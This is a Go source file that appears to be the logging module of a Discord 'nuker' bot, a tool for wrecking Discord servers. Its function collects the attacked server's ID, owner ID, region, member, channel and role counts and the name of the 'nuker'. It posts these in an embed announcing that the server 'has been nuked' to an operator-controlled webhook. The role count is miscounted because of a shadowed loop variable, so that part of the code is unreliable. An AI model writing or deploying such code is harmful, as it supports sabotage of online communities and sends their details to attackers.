package start_end

import (
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Logs(s *discordgo.Session, m *discordgo.MessageCreate) {

	guild, err := s.State.Guild(m.GuildID)
	if err != nil {
		fmt.Println("Error getting guild: ", err)
		return
	}

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_ID := os.Getenv("WEBHOOK_ID")
	WEBHOOK_TOKEN := os.Getenv("WEBHOOK_TOKEN")

	var textChannels int
	channels, _ := s.GuildChannels(guild.ID)
	for _, channel := range channels {
		if channel.Type == discordgo.ChannelTypeGuildText {
			textChannels++
		}
	}

	var rolesInt int
	roles, _ := s.GuildRoles(guild.ID)
	for rolesInt := range roles {
		rolesInt++
	}

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(guild.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     00255,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(guild.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(guild.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(guild.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint(m.Author) + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(guild.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(guild.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}

	s.WebhookExecute(WEBHOOK_ID, WEBHOOK_TOKEN, true, data)

}
